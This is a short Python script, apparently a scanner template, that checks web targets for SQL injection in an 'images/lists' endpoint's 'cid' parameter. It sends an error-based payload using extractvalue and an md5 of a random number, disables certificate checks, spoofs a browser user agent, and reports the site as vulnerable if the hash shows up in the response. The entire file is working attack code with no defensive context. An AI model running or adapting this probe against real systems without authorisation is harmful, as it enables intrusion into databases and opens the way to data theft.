import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(800000000, 1000000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"images/lists?cid=1 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,md5("+str(r1)+"))) desc --+a"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if substr(md5(str(r1).encode()).hexdigest(), 0, 31) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
